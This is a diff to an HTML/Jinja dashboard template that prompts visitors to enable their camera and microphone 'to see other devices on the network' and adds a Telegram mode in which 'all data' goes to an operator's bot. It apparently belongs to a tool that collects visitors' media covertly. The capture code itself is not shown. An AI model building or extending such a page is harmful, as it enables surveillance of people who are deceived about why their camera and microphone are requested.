@@ -12,10 +12,13 @@
         .container{ max-width:1400px; margin:0 auto; }
         .header{ display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1f2a3a; padding-bottom:15px; flex-wrap:wrap; gap:10px; }
         .header h1{ color:#00d4ff; font-weight:300; }
-        .status-badge{ background:#1f2a3a; padding:6px 16px; border-radius:30px; font-size:14px; display:flex; gap:15px; }
+        .status-badge{ background:#1f2a3a; padding:6px 16px; border-radius:30px; font-size:14px; display:flex; gap:15px; align-items:center; }
         .status-badge span{ display:flex; align-items:center; gap:5px; }
         .online-dot{ display:inline-block; width:10px; height:10px; border-radius:50%; background:#00ff88; }
         .offline-dot{ display:inline-block; width:10px; height:10px; border-radius:50%; background:#ff6b6b; }
+        .bot-status{ padding:4px 12px; border-radius:20px; font-size:12px; }
+        .bot-active{ background:#00ff8844; color:#00ff88; border:1px solid #00ff88; }
+        .bot-inactive{ background:#ff6b6b44; color:#ff6b6b; border:1px solid #ff6b6b; }
         .permission-box{ background:#141c28; border:1px solid #2a3a50; border-radius:16px; padding:40px; max-width:560px; margin:60px auto; text-align:center; }
         .permission-box h2{ color:#e8f0f8; font-weight:400; }
         .permission-box p{ color:#8899aa; margin:15px 0 30px; }
@@ -37,6 +40,7 @@
         .audio-bar .fill{ height:100%; background:#00d4ff; border-radius:3px; transition:0.3s; }
         .no-data{ color:#556; font-style:italic; padding:10px 0; }
         .footer{ margin-top:30px; text-align:center; font-size:12px; color:#445; border-top:1px solid #1a2430; padding-top:15px; }
+        .telegram-mode-banner{ background:#1a2430; padding:12px; border-radius:10px; margin-bottom:20px; text-align:center; border:1px solid #2a3a50; }
     </style>
 </head>
 <body>
@@ -46,9 +50,18 @@
         <div class="status-badge">
             <span><span class="online-dot"></span> Online: <span id="onlineCount">0</span></span>
             <span><span class="offline-dot"></span> Offline: <span id="offlineCount">0</span></span>
+            <span class="bot-status {{ 'bot-active' if bot_enabled else 'bot-inactive' }}">
+                {{ '✅ Bot active' if bot_enabled else '❌ Bot not set' }}
+            </span>
         </div>
     </div>
 
+    {% if bot_enabled %}
+    <div class="telegram-mode-banner">
+        <strong>📨 Telegram Mode Active</strong><br>
+        All data is being sent to your Telegram bot. No data is shown here to reduce server load.
+    </div>
+    {% else %}
     <div id="permissionBox" class="permission-box">
         <h2>🎥 Enable Camera & Microphone</h2>
         <p>Grant access to see other devices on the network</p>
@@ -61,10 +74,11 @@
         <div id="clientsGrid" class="client-grid"></div>
         <div class="footer">📦 Data saved locally • Available offline</div>
     </div>
+    {% endif %}
 </div>
 
 <script>
-    // রিকানেক্ট স্ট্র্যাটেজি সহ Socket.IO কানেকশন
+    {% if not bot_enabled %}
     const socket = io({
         reconnection: true,
         reconnectionAttempts: Infinity,
@@ -225,6 +239,7 @@
         localStorage.clear();
         location.reload();
     });
+    {% endif %}
 </script>
 </body>
-    </html>
+                </html>
